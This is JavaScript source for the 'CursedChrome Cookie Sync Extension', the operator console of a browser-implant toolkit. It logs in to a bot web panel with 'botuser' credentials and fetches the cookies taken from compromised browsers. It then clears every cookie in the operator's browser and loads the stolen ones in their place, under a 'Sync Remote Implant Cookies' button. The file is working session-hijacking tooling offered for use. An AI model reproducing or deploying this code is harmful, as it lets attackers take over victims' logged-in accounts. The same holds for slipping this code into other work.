toastr.options.closeButton = true;
toastr.options.progressBar = true;

function clear_cookie(url, name) {
    return new Promise(function(resolve, reject) {
        try {
        	chrome.cookies.remove({
        		url: url,
        		name: name
        	}, () => {
        		resolve();
        	});
        } catch(e) {
            reject(e);
        }
    });
}

function get_all_cookies() {
    return new Promise(function(resolve, reject) {
        try {
        	chrome.cookies.getAll({}, (cookies) => {
        		resolve(cookies);
        	});
        } catch(e) {
            reject(e);
        }
    });
}

function get_url_from_cookie_data(cookie_data) {
	const protocol = cookie_data.secure ? 'https' : 'http';
	var host = cookie_data.domain;
	if(host.startsWith('.')) {
		host = host.substring(1);
	}

	return `${protocol}://${host}${cookie_data.path}`;
}

const app = new Vue({
    data: {
        loading: false,
        page: 'config',
        config: {
            url: '',
            username: '',
            password: '',
            sync_button_disabled: true,
        }
    },
    methods: {
        check_login_credentials: async function(event) {
            // Save valid config to localStorage
            save_bot_config(
                this.config.url,
                this.config.username,
                this.config.password
            );

            if (this.config.url === '' || this.config_message !== null) {
                return
            }

            const url_object = new URL(this.config.url);

            const check_url = `${url_object.origin}/api/v1/verify-proxy-credentials`;

            try {
                var response = await api_request(
                    'POST',
                    check_url, {
                        username: this.config.username,
                        password: this.config.password,
                    }
                );
                this.config.sync_button_disabled = false;
            } catch (e) {
                this.config.sync_button_disabled = true;
                console.error(`Error while trying to check credentials against '${check_url}'`);
                console.error(e);
            }
        },
        sync_cookies_to_browser: async function(event) {
        	const url_object = new URL(this.config.url);
            const check_url = `${url_object.origin}/api/v1/get-bot-browser-cookies`;
            const response = await api_request(
                'POST',
                check_url, {
                    username: this.config.username,
                    password: this.config.password,
                }
            );

            const attrs_to_copy = [
				'domain',
				'expirationDate',
				'httpOnly',
				'name',
				'path',
				'sameSite',
				'secure',
				'value'
            ];

            const browser_cookie_array = response.cookies.map(cookie => {
            	let cookie_data = {};
            	attrs_to_copy.map(attribute_name => {
            		// Firefox and Chrome compatibility bullshit
            		if(attribute_name === 'sameSite' && cookie[attribute_name] === 'unspecified') {
            			cookie_data[attribute_name] = 'lax';
            			return
            		}

            		if(attribute_name in cookie) {
            			cookie_data[attribute_name] = cookie[attribute_name];
            		}
            	});

            	// For some reason we have to generate this even though
            	// we already provide a domain, path, and secure param...
            	const url = get_url_from_cookie_data(cookie_data);
            	cookie_data.url = url;

            	return cookie_data;
            });

            // Clear existing cookies
            // clear_cookie(url, name)
            const existing_cookies = await get_all_cookies();
            const cookie_clear_promises = existing_cookies.map(async existing_cookie => {
            	const url = get_url_from_cookie_data(existing_cookie);
            	return clear_cookie(url, existing_cookie.name);
            });
            await Promise.all(cookie_clear_promises);

            browser_cookie_array.map(cookie => {
            	chrome.cookies.set(cookie, () => {});
            });

            toastr.success('Cookies synced successfully.');
        }
    },
    computed: {
        config_message: function() {
            if (this.config.url === '') {
                return null;
            }

            if (!this.config.url.startsWith('http://') && !this.config.url.startsWith('https://')) {
            	this.config.sync_button_disabled = true;
                return 'Web Panel URL must start with either http:// or https://';
            }

            if (!this.config.username.startsWith('botuser')) {
            	this.config.sync_button_disabled = true;
                return 'Bot username should start with "botuser"';
            }

            if (this.config.password === '') {
            	this.config.sync_button_disabled = true;
                return 'Bot password must not be empty';
            }

            return null;
        },
    },
    watch: {
        config: {
            handler(val) {
                this.check_login_credentials();
            },
            deep: true
        }
    },
    mounted: function() {
        this.$nextTick(function() {
            load_bot_config();
            this.check_login_credentials();
        });
    },
    render: function(_c) {
        const subtrees = [
            function() {with(this){return _c('div',{staticClass:"input-group-prepend"},[_c('span',{staticClass:"input-group-text"},[_v("Web Panel URL")])])}},
            function() {with(this){return _c('div',{staticClass:"input-group-prepend"},[_c('span',{staticClass:"input-group-text"},[_v("Bot Username")])])}},
            function() {with(this){return _c('div',{staticClass:"input-group-prepend"},[_c('span',{staticClass:"input-group-text"},[_v("Bot Password")])])}},
            function() {with(this){return _c('button',{staticClass:"btn btn-block btn-primary",staticStyle:{"pointer-events":"none"},attrs:{"type":"button","disabled":""}},[_c('i',{staticClass:"fas fa-sync"}),_v(" Sync Remote Implant Cookies\\n                        ")])}}
        ];

        this._m = function(i) {
            return subtrees[i].call(this);
        }

        with(this){return _c('div',{attrs:{"id":"app"}},[_c('div',{staticClass:"card"},[_c('div',{staticClass:"card-header"},[(loading)?_c('span',{staticClass:"badge badge-secondary"},[_c('span',{staticClass:"spinner-border spinner-border-sm mr-1",attrs:{"role":"status","aria-hidden":"true"}}),_v("Loading...\n                ")]):_e(),_v("\n                CursedChrome Cookie Sync Extension\n            ")]),_v(" "),_c('div',{staticClass:"card-body",staticStyle:{"min-width":"500px","padding":"20px"}},[_c('div',[_c('h5',{staticClass:"card-title"},[_v("Extension Configuration")]),_v(" "),(config_message)?_c('div',{staticClass:"alert alert-danger",attrs:{"role":"alert"}},[_v("\n                        "+_s(config_message)+"\n                    ")]):_e(),_v(" "),_c('div',{staticClass:"card-text"},[_c('div',{staticClass:"input-group mb-3"},[_m(0),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.url),expression:"config.url"}],staticClass:"form-control",attrs:{"type":"text","placeholder":"http://localhost:8118"},domProps:{"value":(config.url)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "url", $event.target.value)}}})]),_v(" "),_c('div',{staticClass:"input-group mb-3"},[_m(1),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.username),expression:"config.username"}],staticClass:"form-control",attrs:{"type":"text","placeholder":"botuserxxxxxxxx"},domProps:{"value":(config.username)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "username", $event.target.value)}}})]),_v(" "),_c('div',{staticClass:"input-group mb-3"},[_m(2),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.password),expression:"config.password"}],staticClass:"form-control",attrs:{"type":"password","placeholder":"*********"},domProps:{"value":(config.password)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "password", $event.target.value)}}})])]),_v(" "),_c('hr'),_v(" "),(config.sync_button_disabled)?_c('span',{staticClass:"d-inline-block",staticStyle:{"width":"100%"},attrs:{"rel":"tooltip","tabindex":"0","data-toggle":"tooltip","title":"Valid configuration required."}},[_m(3)]):_e(),_v(" "),(!config.sync_button_disabled)?_c('button',{staticClass:"btn btn-block btn-primary",attrs:{"type":"button"},on:{"click":sync_cookies_to_browser}},[_c('i',{staticClass:"fas fa-sync"}),_v(" Sync Remote Implant Cookies\n                    ")]):_e()])])])])}
        with(this){return _c('div',{attrs:{"id":"app"}},[_c('div',{staticClass:"card"},[_c('div',{staticClass:"card-header"},[(loading)?_c('span',{staticClass:"badge badge-secondary"},[_c('span',{staticClass:"spinner-border spinner-border-sm mr-1",attrs:{"role":"status","aria-hidden":"true"}}),_v("Loading...\n                ")]):_e(),_v("\n                CursedChrome Cookie Sync Extension\n            ")]),_v(" "),_c('div',{staticClass:"card-body",staticStyle:{"min-width":"500px","padding":"20px"}},[_c('div',[_c('h5',{staticClass:"card-title"},[_v("Extension Configuration")]),_v(" "),(config_message)?_c('div',{staticClass:"alert alert-danger",attrs:{"role":"alert"}},[_v("\n                        "+_s(config_message)+"\n                    ")]):_e(),_v(" "),_c('p',{staticClass:"card-text"}),_c('div',{staticClass:"input-group mb-3"},[_v(" "),_c('input')])])])])])}
        with(this){return _c('div',{attrs:{"id":"app"}},[_c('div',{staticClass:"card"},[_c('div',{staticClass:"card-header"},[(loading)?_c('span',{staticClass:"badge badge-secondary"},[_c('span',{staticClass:"spinner-border spinner-border-sm mr-1",attrs:{"role":"status","aria-hidden":"true"}}),_v("Loading...\n                ")]):_e(),_v("\n                CursedChrome Cookie Sync Extension\n            ")]),_v(" "),_c('div',{staticClass:"card-body",staticStyle:{"min-width":"500px","padding":"20px"}},[_c('div',[_c('h5',{staticClass:"card-title"},[_v("Extension Configuration")]),_v(" "),(config_message)?_c('div',{staticClass:"alert alert-danger",attrs:{"role":"alert"}},[_v("\n                        "+_s(config_message)+"\n                    ")]):_e(),_v(" "),_c('p',{staticClass:"card-text"}),_c('div',{staticClass:"input-group mb-3"},[_m(0),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.url),expression:"config.url"}],staticClass:"form-control",attrs:{"type":"text","placeholder":"http://localhost:8118"},domProps:{"value":(config.url)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "url", $event.target.value)}}})]),_v(" "),_c('div',{staticClass:"input-group mb-3"},[_m(1),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.username),expression:"config.username"}],staticClass:"form-control",attrs:{"type":"text","placeholder":"botuserxxxxxxxx"},domProps:{"value":(config.username)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "username", $event.target.value)}}})]),_v(" "),_c('div',{staticClass:"input-group mb-3"},[_m(2),_v(" "),_c('input',{directives:[{name:"model",rawName:"v-model",value:(config.password),expression:"config.password"}],staticClass:"form-control",attrs:{"type":"password","placeholder":"*********"},domProps:{"value":(config.password)},on:{"keypress":check_login_credentials,"paste":check_login_credentials,"change":check_login_credentials,"input":function($event){if($event.target.composing)return;$set(config, "password", $event.target.value)}}})]),_v(" "),_c('p'),_v(" "),_c('hr'),_v(" "),(config.sync_button_disabled)?_c('span',{staticClass:"d-inline-block",staticStyle:{"width":"100%"},attrs:{"rel":"tooltip","tabindex":"0","data-toggle":"tooltip","title":"Valid configuration required."}},[_m(3)]):_e(),_v(" "),(!config.sync_button_disabled)?_c('button',{staticClass:"btn btn-block btn-primary",attrs:{"type":"button"},on:{"click":sync_cookies_to_browser}},[_c('i',{staticClass:"fas fa-sync"}),_v(" Sync Remote Implant Cookies\n                    ")]):_e()])])])])}
    }
}).$mount('#app');

function save_bot_config(url, username, password) {
    localStorage.setItem('BOT_CREDENTIALS', JSON.stringify({
        'url': url,
        'username': username,
        'password': password
    }));
}

function load_bot_config() {
    const raw_localstorage_data = localStorage.getItem('BOT_CREDENTIALS');

    if (!raw_localstorage_data) {
        return;
    }

    const bot_credentials = JSON.parse(localStorage.getItem('BOT_CREDENTIALS'));

    app.config.url = bot_credentials.url;
    app.config.username = bot_credentials.username;
    app.config.password = bot_credentials.password;
}

$(function() {
    $("[rel='tooltip']").tooltip();
});

async function api_request(method, url, body) {
    var request_options = {
        method: method,
        credentials: 'include',
        mode: 'cors',
        cache: 'no-cache',
        headers: {
            'Content-Type': 'application/json',
        },
        redirect: 'follow'
    };

    if (body) {
        request_options.body = JSON.stringify(body);
    }

    window.app.loading = true;

    try {
        var response = await fetch(
            `${url}`,
            request_options
        );
    } catch (e) {
        window.app.loading = false;
        throw e;
    }
    window.app.loading = false;

    const response_body = await response.json();

    if (!response_body.success) {
        return Promise.reject({
            'error': response_body.error,
            'code': response_body.code
        })
    }

    return response_body.result;
}